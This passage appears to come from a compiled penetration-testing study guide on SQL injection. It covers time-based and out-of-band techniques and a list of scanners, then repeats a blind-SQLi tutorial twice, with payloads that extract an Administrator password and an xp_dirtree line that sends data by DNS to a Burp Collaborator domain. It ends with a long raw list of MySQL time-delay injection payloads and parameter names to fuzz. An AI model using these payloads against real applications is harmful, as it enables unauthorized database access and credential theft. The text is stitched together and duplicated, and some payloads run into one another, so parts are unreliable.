Time-based SQL Injection is an inferential SQL Injection technique that relies on sending an 
SQL query to the database which forces the database to wait for a specified amount of time (in 
seconds) before responding. The response time will indicate to the attacker whether the result 
of the query is TRUE or FALSE. 
Depending on the result, an HTTP response will be returned with a delay, or returned 
immediately. This allows an attacker to infer if the payload used returned true or false, even 
though no data from the database is returned. This attack is typically slow (especially on large 
databases) since an attacker would need to enumerate a database character by character. 
Out-of-band SQLi 
Out-of-band SQL Injection is not very common, mostly because it depends on features being 
enabled on the database server being used by the web application. Out-of-band SQL Injection 
occurs when an attacker is unable to use the same channel to launch the attack and gather 
results. 
Out-of-band techniques, offer an attacker an alternative to inferential time-based techniques, 
especially if the server responses are not very stable (making an inferential time-based attack 
unreliable). 
Out-of-band SQLi techniques would rely on the database server’s ability to make DNS or HTTP 
requests to deliver data to an attacker. Such is the case with Microsoft SQL 
Server’s xp_dirtree command, which can be used to make DNS requests to a server an attacker 
[[ PAGE 231 ]]
controls; as well as Oracle Database’s UTL_HTTP package, which can be used to send HTTP 
requests from SQL and PL/SQL to a server an attacker controls. 
https://www.acunetix.com/websitesecurity/sql-injection2/ 
suIP.biz 
Detecting SQL Injection flaws online by suIP.biz support MySQL, Oracle, PostgreSQL, Microsoft 
SQL, IBM DB2, Firebird, Sybase, etc. database. 
 
SQLMap powers it so it will test against all six injection techniques. 
SQL Injection Test Online 
Another online tool by Hacker Target based on SQLMap to find bind & error based 
vulnerability against HTTP GET request. 
 
Invicti 
An enterprise-ready comprehensive web security scanner – Invicti does more than just the SQL 
vulnerability test. You can integrate with SDLC to automate web security. 
[[ PAGE 232 ]]
 
Check out this vulnerability index, which is covered by the Invicti scan. 
Vega 
Vega is an open-source security scanner software that can be installed on Linux, OS X, and 
Windows. 
 
Vega is written in Java, and it is GUI based. 
Not just SQLi, but you can use Vega to test many other vulnerabilities such as: 
• 
XML /Shell/URL injection 
• 
Directory listing 
• 
Remote file includes 
• 
XSS 
• 
And much more… 
[[ PAGE 233 ]]
Vega looks promising FREE web security scanner. 
SQLMap 
SQLMap is one of the popular open-source testing tools to perform SQL injection against a 
relational database management system. 
 
Sqlmap enumerates users, passwords, hashes, roles, databases, tables, columns, and support 
to dump database tables entirely. 
SQLMap is also available on Kali Linux. You can refer to this guide to install Kali Linux on 
VMWare Fusion. 
SQL Injection Scanner 
An online scanner by Pentest-Tools test using OWASP ZAP. There are two options – light (FREE) 
and full (need to be registered). 
 
Appspider 
Appspider by Rapid7 is a dynamic application security testing solution to crawl and test a web 
application for more than 95 types of attack. 
[[ PAGE 234 ]]
 
The unique feature by Appspider called vulnerability validator lets the developer reproduce 
the vulnerability in real-time. 
This becomes handy when you have remediated the vulnerability and would like to re-test to 
ensure the risk is fixed. 
Acunetix 
Acunetix is an enterprise-ready web application vulnerability scanner, trusted by more than 
4000 brands worldwide. Not just the SQLi scan, but the tool is capable of finding more than 
6000 vulnerabilities. 
[[ PAGE 235 ]]
 
Each finding is classified with potential fixes, so you know what to do to get it fixed. Further, 
you can integrate with CI/CD system and SDLC, so every security risk is identified and fixed 
before the application is deployed to production. 
Wapiti 
Wapiti is a python-based black-box vulnerability scanner. It supports a large number of attack 
detection. 
• 
SQLi and XPath 
• 
CRLS and XSS 
• 
Shellshock 
• 
File disclosure 
• 
Server-side request forgery 
• 
Command execution 
and more.. 
It supports HTTP/HTTPS endpoint, multiple authentication types like Basic, Digest, NTLM, and 
Kerberos. You have an option to generate scan reports in HTML, XML, JSON, and TXT format. 
Scant3r 
A docker ready, scant3r is a lightweight scanner based on Python. 
[[ PAGE 236 ]]
 
It looks for potential XSS, SQLi, RCE, SSTI from headers and URL parameters. 
https://geekflare.com/find-sql-injection/  
Blind SQL Injection 
What is blind SQL injection? 
Blind SQL injection arises when an application is vulnerable to SQL injection, but its HTTP 
responses do not contain the results of the relevant SQL query or the details of any database 
errors. 
With blind SQL injection vulnerabilities, many techniques such as UNION attacks, are not 
effective because they rely on being able to see the results of the injected query within the 
application's responses. It is still possible to exploit blind SQL injection to access unauthorized 
data, but different techniques must be used. 
Exploiting blind SQL injection by triggering conditional responses 
Consider an application that uses tracking cookies to gather analytics about usage. Requests to 
the application include a cookie header like this: 
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4 
When a request containing a TrackingId cookie is processed, the application determines 
whether this is a known user using an SQL query like this: 
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4' 
This query is vulnerable to SQL injection, but the results from the query are not returned to the 
user. However, the application does behave differently depending on whether the query 
returns any data. If it returns data (because a recognized TrackingId was submitted), then a 
"Welcome back" message is displayed within the page. 
This behavior is enough to be able to exploit the blind SQL injection vulnerability and retrieve 
information by triggering different responses conditionally, depending on an injected 
condition. To see how this works, suppose that two requests are sent containing the 
following TrackingId cookie values in turn: 
[[ PAGE 237 ]]
…xyz' AND '1'='1 
…xyz' AND '1'='2 
The first of these values will cause the query to return results, because the injected AND 
'1'='1 condition is true, and so the "Welcome back" message will be displayed. Whereas the 
second value will cause the query to not return any results, because the injected condition is 
false, and so the "Welcome back" message will not be displayed. This allows us to determine 
the answer to any single injected condition, and so extract data one bit at a time. 
For example, suppose there is a table called Users with the columns Username and Password, 
and a user called Administrator. We can systematically determine the password for this user 
by sending a series of inputs to test the password one character at a time. 
To do this, we start with the following input: 
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) 
> 'm 
This returns the "Welcome back" message, indicating that the injected condition is true, and so 
the first character of the password is greater than m. 
Next, we send the following input: 
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) 
> 't 
This does not return the "Welcome back" message, indicating that the injected condition is 
false, and so the first character of the password is not greater than t. 
Eventually, we send the following input, which returns the "Welcome back" message, thereby 
confirming that the first character of the password is s: 
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) 
= 's 
We can continue this process to systematically determine the full password for 
the Administrator user. 
Inducing conditional responses by triggering SQL errors 
In the preceding example, suppose instead that the application carries out the same SQL 
query, but does not behave any differently depending on whether the query returns any data. 
The preceding technique will not work, because injecting different Boolean conditions makes 
no difference to the application's responses. 
In this situation, it is often possible to induce the application to return conditional responses 
by triggering SQL errors conditionally, depending on an injected condition. This involves 
modifying the query so that it will cause a database error if the condition is true, but not if the 
condition is false. Very often, an unhandled error thrown by the database will cause some 
difference in the application's response (such as an error message), allowing us to infer the 
truth of the injected condition. 
To see how this works, suppose that two requests are sent containing the 
following TrackingId cookie values in turn: 
[[ PAGE 238 ]]
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a 
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a 
These inputs use the CASE keyword to test a condition and return a different expression 
depending on whether the expression is true. With the first input, the CASE expression 
evaluates to 'a', which does not cause any error. With the second input, it evaluates to 1/0, 
which causes a divide-by-zero error. Assuming the error causes some difference in the 
application's HTTP response, we can use this difference to infer whether the injected condition 
is true. 
Using this technique, we can retrieve data in the way already described, by systematically 
testing one character at a time: 
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 
'm') THEN 1/0 ELSE 'a' END FROM Users)='a 
Exploiting blind SQL injection by triggering time delays 
In the preceding example, suppose that the application now catches database errors and 
handles them gracefully. Triggering a database error when the injected SQL query is executed 
no longer causes any difference in the application's response, so the preceding technique of 
inducing conditional errors will not work. 
In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering 
time delays conditionally, depending on an injected condition. Because SQL queries are 
generally processed synchronously by the application, delaying the execution of an SQL query 
will also delay the HTTP response. This allows us to infer the truth of the injected condition 
based on the time taken before the HTTP response is received. 
The techniques for triggering a time delay are highly specific to the type of database being 
used. On Microsoft SQL Server, input like the following can be used to test a condition and 
trigger a delay depending on whether the expression is true: 
'; IF (1=2) WAITFOR DELAY '0:0:10'-- 
'; IF (1=1) WAITFOR DELAY '0:0:10'-- 
The first of these inputs will not trigger a delay, because the condition 1=2 is false. The second 
input will trigger a delay of 10 seconds, because the condition 1=1 is true. 
Using this technique, we can retrieve data in the way already described, by systematically 
testing one character at a time: 
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND 
SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'-- 
Blind SQL injection 
In this section, we'll describe what blind SQL injection is, explain various techniques for finding 
and exploiting blind SQL injection vulnerabilities. 
What is blind SQL injection? 
[[ PAGE 239 ]]
Blind SQL injection arises when an application is vulnerable to SQL injection, but its HTTP 
responses do not contain the results of the relevant SQL query or the details of any database 
errors. 
With blind SQL injection vulnerabilities, many techniques such as UNION attacks, are not 
effective because they rely on being able to see the results of the injected query within the 
application's responses. It is still possible to exploit blind SQL injection to access unauthorized 
data, but different techniques must be used. 
Exploiting blind SQL injection by triggering conditional responses 
Consider an application that uses tracking cookies to gather analytics about usage. Requests to 
the application include a cookie header like this: 
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4 
When a request containing a TrackingId cookie is processed, the application determines 
whether this is a known user using an SQL query like this: 
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4' 
This query is vulnerable to SQL injection, but the results from the query are not returned to the 
user. However, the application does behave differently depending on whether the query 
returns any data. If it returns data (because a recognized TrackingId was submitted), then a 
"Welcome back" message is displayed within the page. 
This behavior is enough to be able to exploit the blind SQL injection vulnerability and retrieve 
information by triggering different responses conditionally, depending on an injected 
condition. To see how this works, suppose that two requests are sent containing the 
following TrackingId cookie values in turn: 
…xyz' AND '1'='1 
…xyz' AND '1'='2 
The first of these values will cause the query to return results, because the injected AND 
'1'='1 condition is true, and so the "Welcome back" message will be displayed. Whereas the 
second value will cause the query to not return any results, because the injected condition is 
false, and so the "Welcome back" message will not be displayed. This allows us to determine 
the answer to any single injected condition, and so extract data one bit at a time. 
For example, suppose there is a table called Users with the columns Username and Password, 
and a user called Administrator. We can systematically determine the password for this user 
by sending a series of inputs to test the password one character at a time. 
To do this, we start with the following input: 
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) 
> 'm 
This returns the "Welcome back" message, indicating that the injected condition is true, and so 
the first character of the password is greater than m. 
Next, we send the following input: 
[[ PAGE 240 ]]
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) 
> 't 
This does not return the "Welcome back" message, indicating that the injected condition is 
false, and so the first character of the password is not greater than t. 
Eventually, we send the following input, which returns the "Welcome back" message, thereby 
confirming that the first character of the password is s: 
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) 
= 's 
We can continue this process to systematically determine the full password for 
the Administrator user. 
Note 
The SUBSTRING function is called SUBSTR on some types of database. For more details, see 
the SQL injection cheat sheet. 
LAB 
PRACTITIONERBlind SQL injection with conditional responses 
Inducing conditional responses by triggering SQL errors 
In the preceding example, suppose instead that the application carries out the same SQL 
query, but does not behave any differently depending on whether the query returns any data. 
The preceding technique will not work, because injecting different Boolean conditions makes 
no difference to the application's responses. 
In this situation, it is often possible to induce the application to return conditional responses 
by triggering SQL errors conditionally, depending on an injected condition. This involves 
modifying the query so that it will cause a database error if the condition is true, but not if the 
condition is false. Very often, an unhandled error thrown by the database will cause some 
difference in the application's response (such as an error message), allowing us to infer the 
truth of the injected condition. 
To see how this works, suppose that two requests are sent containing the 
following TrackingId cookie values in turn: 
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a 
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a 
These inputs use the CASE keyword to test a condition and return a different expression 
depending on whether the expression is true. With the first input, the CASE expression 
evaluates to 'a', which does not cause any error. With the second input, it evaluates to 1/0, 
which causes a divide-by-zero error. Assuming the error causes some difference in the 
application's HTTP response, we can use this difference to infer whether the injected condition 
is true. 
Using this technique, we can retrieve data in the way already described, by systematically 
testing one character at a time: 
[[ PAGE 241 ]]
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 
'm') THEN 1/0 ELSE 'a' END FROM Users)='a 
Note 
There are various ways of triggering conditional errors, and different techniques work best on 
different database types. For more details, see the SQL injection cheat sheet. 
LAB 
PRACTITIONERBlind SQL injection with conditional errors 
Exploiting blind SQL injection by triggering time delays 
In the preceding example, suppose that the application now catches database errors and 
handles them gracefully. Triggering a database error when the injected SQL query is executed 
no longer causes any difference in the application's response, so the preceding technique of 
inducing conditional errors will not work. 
In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering 
time delays conditionally, depending on an injected condition. Because SQL queries are 
generally processed synchronously by the application, delaying the execution of an SQL query 
will also delay the HTTP response. This allows us to infer the truth of the injected condition 
based on the time taken before the HTTP response is received. 
The techniques for triggering a time delay are highly specific to the type of database being 
used. On Microsoft SQL Server, input like the following can be used to test a condition and 
trigger a delay depending on whether the expression is true: 
'; IF (1=2) WAITFOR DELAY '0:0:10'-- 
'; IF (1=1) WAITFOR DELAY '0:0:10'-- 
The first of these inputs will not trigger a delay, because the condition 1=2 is false. The second 
input will trigger a delay of 10 seconds, because the condition 1=1 is true. 
Using this technique, we can retrieve data in the way already described, by systematically 
testing one character at a time: 
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND 
SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'-- 
Note 
There are various ways of triggering time delays within SQL queries, and different techniques 
apply on different types of database. For more details, see the SQL injection cheat sheet. 
LAB 
PRACTITIONERBlind SQL injection with time delays 
LAB 
PRACTITIONERBlind SQL injection with time delays and information retrieval 
Exploiting blind SQL injection using out-of-band (OAST) techniques 
[[ PAGE 242 ]]
Now, suppose that the application carries out the same SQL query, but does it asynchronously. 
The application continues processing the user's request in the original thread, and uses 
another thread to execute an SQL query using the tracking cookie. The query is still vulnerable 
to SQL injection, however none of the techniques described so far will work: the application's 
response doesn't depend on whether the query returns any data, or on whether a database 
error occurs, or on the time taken to execute the query. 
In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering 
out-of-band network interactions to a system that you control. As previously, these can be 
triggered conditionally, depending on an injected condition, to infer information one bit at a 
time. But more powerfully, data can be exfiltrated directly within the network interaction 
itself. 
A variety of network protocols can be used for this purpose, but typically the most effective is 
DNS (domain name service). This is because very many production networks allow free egress 
of DNS queries, because they are essential for the normal operation of production systems. 
The easiest and most reliable way to use out-of-band techniques is using Burp Collaborator. 
This is a server that provides custom implementations of various network services (including 
DNS), and allows you to detect when network interactions occur as a result of sending 
individual payloads to a vulnerable application. Support for Burp Collaborator is built in to Burp 
Suite Professional with no configuration required. 
The techniques for triggering a DNS query are highly specific to the type of database being 
used. On Microsoft SQL Server, input like the following can be used to cause a DNS lookup on a 
specified domain: 
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'-- 
This will cause the database to perform a lookup for the following domain: 
0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net 
You can use Burp Suite's Collaborator client to generate a unique subdomain and poll the 
Collaborator server to confirm when any DNS lookups occur. 
https://portswigger.net/web-security/sql-injection/blind 
Parameter list (regular): 
id 
cid 
pid 
page 
search 
username 
name 
register 
first name 
last name 
email 
pass 
password 
[[ PAGE 243 ]]
dir 
category 
class 
register 
file 
news 
item 
menu 
lang 
name 
ref 
title 
time 
view 
topic 
thread 
type 
date 
form 
join 
main 
nav 
region 
select 
report 
role 
update 
query 
user 
sort 
where 
params 
process 
row 
table 
from 
results 
sleep 
fetch 
order 
keyword 
column 
field 
delete 
string 
number 
filter 
[[ PAGE 244 ]]
Payload list: 
MySQL Blind (Time Based): 
0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z 
0'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z 
if(now()=sysdate(),sleep(5),0) 
'XOR(if(now()=sysdate(),sleep(5),0))XOR' 
'XOR(if(now()=sysdate(),sleep(5*1),0))OR'if(now()=sysdate(),sleep(5),0)/"XOR(if(now()=sysdate
(),sleep(5),0))OR"/if(now()=sysdate(),sleep(5),0)/*'XOR(if(now()=sysdate(),sleep(5),0))OR'"XOR
(if(now()=sysdate(),sleep(5),0))OR"*/if(now()=sysdate(),sleep(5),0)/'XOR(if(now()=sysdate(),sle
ep(5),0))OR'"XOR(if(now()=sysdate(),sleep(5),0) and 5=5)"/SLEEP(5)/*' or SLEEP(5) or '" or 
SLEEP(5) or "*/%2c(select%5*%5from%5(select(sleep(5)))a) 
(select(0)from(select(sleep(5)))v) 
(SELECT SLEEP(5)) 
'%2b(select*from(select(sleep(5)))a)%2b' 
(select*from(select(sleep(5)))a) 
1'%2b(select*from(select(sleep(5)))a)%2b' 
,(select * from (select(sleep(5)))a) 
desc%2c(select*from(select(sleep(5)))a) 
-1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(5))A)) 
-1+or+1=((SELECT+1+FROM+(SELECT+SLEEP(5))A))(SELECT * FROM 
(SELECT(SLEEP(5)))YYYY)(SELECT * FROM (SELECT(SLEEP(5)))YYYY)#(SELECT * FROM 
(SELECT(SLEEP(5)))YYYY)--
'+(select*from(select(sleep(5)))a)+'(select(0)from(select(sleep(5)))v)%2f'+(select(0)from(select(
sleep(5)))v)+'"(select(0)from(select(sleep(5)))v)%2f*'+(select(0)from(select(sleep(5)))v)+'"+(sel
ect(0)from(select(sleep(5)))v)+"*%2f(select(0)from(select(sleep(5)))v)/*'+(select(0)from(select(
sleep(5)))v)+'"+(select(0)from(select(sleep(5)))v)+"*/AND BLIND:1 and sleep 5-- 
1 and sleep 5 
1 and sleep(5)-- 
1 and sleep(5) 
' and sleep 5-- 
' and sleep 5 
' and sleep 5 and '1'='1 
' and sleep(5) and '1'='1 
' and sleep(5)-- 
' and sleep(5) 
' AnD SLEEP(5) ANd '1 
and sleep 5-- 
and sleep 5 
and sleep(5)-- 
and sleep(5) 
and SELECT SLEEP(5); # 
AnD SLEEP(5) 
AnD SLEEP(5)-- 
AnD SLEEP(5)# 
 and sleep 5-- 
 and sleep 5 
 and sleep(5)-- 
[[ PAGE 245 ]]
 and sleep(5) 
 and SELECT SLEEP(5); # 
' AND SLEEP(5)# 
" AND SLEEP(5)# 
') AND SLEEP(5)#OR BLIND:or sleep 5-- 
or sleep 5 
or sleep(5)-- 
or sleep(5) 
or SELECT SLEEP(5); # 
or SLEEP(5) 
or SLEEP(5)# 
or SLEEP(5)-- 
or SLEEP(5)=" 
or SLEEP(5)=' 
 or sleep 5-- 
 or sleep 5 
 or sleep(5)-- 
 or sleep(5) 
 or SELECT SLEEP(5); # 
' OR SLEEP(5)# 
" OR SLEEP(5)# 
') OR SLEEP(5)# 
You can replace AND / OR1 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) 
1 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND (1337=1337 
1 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337 
' AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND '1337'='1337 
') AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ('PBiy'='PBiy 
) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337 
) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND (1337=1337 
)) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ((1337=1337 
))) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND (((1337=1337 
1 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)# 1337 
) WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337 
1 WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337 
+(SELECT 1337 WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY))+ 
)) AS 1337 WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337 
) AS 1337 WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337 
` WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337 
`) WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337 
`=`1` AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND `1`=`1 
]-(SELECT 0 WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY))|[1 
') AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337 
' AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337 
" AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337 
') AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ('1337'='1337 
')) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND (('1337'='1337 
'))) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ((('1337'='1337 
' AND (SELECT 3122 FROM (SELECT(SLEEP(5)))YYYY) AND '1337'='1337 
[[ PAGE 246 ]]
') AND (SELECT 4796 FROM (SELECT(SLEEP(5)))YYYY) AND ('1337'='1337 
')) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND (('1337' LIKE '1337 
'))) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ((('1337' LIKE '1337 
%' AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND '1337%'='1337 
' AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND '1337' LIKE '1337 
") AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ("1337"="1337 
")) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND (("1337"="1337 
"))) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ((("1337"="1337 
" AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND "1337"="1337 
") AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ("1337" LIKE "1337 
")) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND (("1337" LIKE "1337 
"))) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ((("1337" LIKE "1337 
" AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND "1337" LIKE "1337 
' AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) OR '1337'='1337 
') WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337 
") WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337RLIKE 
BLIND:You can replace AND / ORRLIKE SLEEP(5)-- 
' RLIKE SLEEP(5)-- 
' RLIKE SLEEP(5)-- 1337 
" RLIKE SLEEP(5)-- 1337 
') RLIKE SLEEP(5)-- 1337 
') RLIKE SLEEP(5) AND ('1337'='1337 
')) RLIKE SLEEP(5) AND (('1337'='1337 
'))) RLIKE SLEEP(5) AND ((('1337'='1337 
) RLIKE SLEEP(5)-- 1337 
) RLIKE SLEEP(5) AND (1337=1337 
)) RLIKE SLEEP(5) AND ((1337=1337 
))) RLIKE SLEEP(5) AND (((1337=1337 
1 RLIKE SLEEP(5) 
1 RLIKE SLEEP(5)-- 1337 
1 RLIKE SLEEP(5)# 1337 
) WHERE 1337=1337 RLIKE SLEEP(5)-- 1337 
1 WHERE 1337=1337 RLIKE SLEEP(5)-- 1337 
+(SELECT 1337 WHERE 1337=1337 RLIKE SLEEP(5))+ 
)) AS 1337 WHERE 1337=1337 RLIKE SLEEP(5)-- 1337 
) AS 1337 WHERE 1337=1337 RLIKE SLEEP(5)-- 1337 
` WHERE 1337=1337 RLIKE SLEEP(5)-- 1337 
`) WHERE 1337=1337 RLIKE SLEEP(5)-- 1337 
' RLIKE SLEEP(5) AND '1337'='1337 
') RLIKE SLEEP(5) AND ('1337' LIKE '1337 
')) RLIKE SLEEP(5) AND (('1337' LIKE '1337 
'))) RLIKE SLEEP(5) AND ((('1337' LIKE '1337 
%' RLIKE SLEEP(5) AND '1337%'='1337 
' RLIKE SLEEP(5) AND '1337' LIKE '1337 
") RLIKE SLEEP(5) AND ("1337"="1337 
")) RLIKE SLEEP(5) AND (("1337"="1337 
"))) RLIKE SLEEP(5) AND ((("1337"="1337 
" RLIKE SLEEP(5) AND "1337"="1337 
[[ PAGE 247 ]]
") RLIKE SLEEP(5) AND ("1337" LIKE "1337 
")) RLIKE SLEEP(5) AND (("1337" LIKE "1337 
"))) RLIKE SLEEP(5) AND ((("1337" LIKE "1337 
" RLIKE SLEEP(5) AND "1337" LIKE "1337 
' RLIKE SLEEP(5) OR '1337'='1337 
') WHERE 1337=1337 RLIKE SLEEP(5)-- 1337 
") WHERE 1337=1337 RLIKE SLEEP(5)-- 1337 
' WHERE 1337=1337 RLIKE SLEEP(5)-- 1337 
" WHERE 1337=1337 RLIKE SLEEP(5)-- 1337 
ELT Blind:You can replace AND / OR' AND ELT(1337=1337,SLEEP(5))-- 
' AND ELT(1337=1337,SLEEP(5))-- 1337 
" AND ELT(1337=1337,SLEEP(5))-- 1337 
') AND ELT(1337=1337,SLEEP(5))-- 1337 
') AND ELT(1337=1337,SLEEP(5)) AND ('1337'='1337 
')) AND ELT(1337=1337,SLEEP(5)) AND (('1337'='1337 
'))) AND ELT(1337=1337,SLEEP(5)) AND ((('1337'='1337 
' AND ELT(1337=1337,SLEEP(5)) AND '1337'='1337 
') AND ELT(1337=1337,SLEEP(5)) AND ('1337' LIKE '1337 
')) AND ELT(1337=1337,SLEEP(5)) AND (('1337' LIKE '1337 
'))) AND ELT(1337=1337,SLEEP(5)) AND ((('1337' LIKE '1337 
) AND ELT(1337=1337,SLEEP(5))-- 1337 
) AND ELT(1337=1337,SLEEP(5)) AND (1337=1337 
)) AND ELT(1337=1337,SLEEP(5)) AND ((1337=1337 
))) AND ELT(1337=1337,SLEEP(5)) AND (((1337=1337 
1 AND ELT(1337=1337,SLEEP(5)) 
1 AND ELT(1337=1337,SLEEP(5))-- 1337 
1 AND ELT(1337=1337,SLEEP(5))# 1337 
) WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337 
1 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337 
+(SELECT 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5)))+ 
)) AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337 
) AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337 
` WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337 
`) WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337 
1`=`1` AND ELT(1337=1337,SLEEP(5)) AND `1`=`1 
]-(SELECT 0 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5)))|[1 
%' AND ELT(1337=1337,SLEEP(5)) AND '1337%'='1337 
' AND ELT(1337=1337,SLEEP(5)) AND '1337' LIKE '1337 
") AND ELT(1337=1337,SLEEP(5)) AND ("1337"="1337 
")) AND ELT(1337=1337,SLEEP(5)) AND (("1337"="1337 
"))) AND ELT(1337=1337,SLEEP(5)) AND ((("1337"="1337 
" AND ELT(1337=1337,SLEEP(5)) AND "1337"="1337 
") AND ELT(1337=1337,SLEEP(5)) AND ("1337" LIKE "1337 
")) AND ELT(1337=1337,SLEEP(5)) AND (("1337" LIKE "1337 
"))) AND ELT(1337=1337,SLEEP(5)) AND ((("1337" LIKE "1337 
" AND ELT(1337=1337,SLEEP(5)) AND "1337" LIKE "1337 
' AND ELT(1337=1337,SLEEP(5)) OR '1337'='FMTE 
') WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337 
[[ PAGE 248 ]]
") WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337 
' WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337 
" WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337 
'||(SELECT 0x4c454f67 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5)))||' 
'||(SELECT 0x727a5277 FROM DUAL WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5)))||' 
'+(SELECT 0x4b6b486c WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5)))+' 
||(SELECT 0x57556971 FROM DUAL WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5)))|| 
||(SELECT 0x67664847 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5)))|| 
+(SELECT 0x74764164 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5)))+ 
')) AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337 
")) AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337 
') AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337 
") AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337 
BENCHMARK:You can replace AND / OR' AND 
1337=BENCHMARK(5000000,MD5(0x774c5341))-- 
' AND 1337=BENCHMARK(5000000,MD5(0x774c5341))-- 1337 
" AND 1337=BENCHMARK(5000000,MD5(0x774c5341))-- 1337 
') AND =BENCHMARK(5000000,MD5(0x774c5341))-- 
') AND 1337=BENCHMARK(5000000,MD5(0x774c5341))-- 1337 
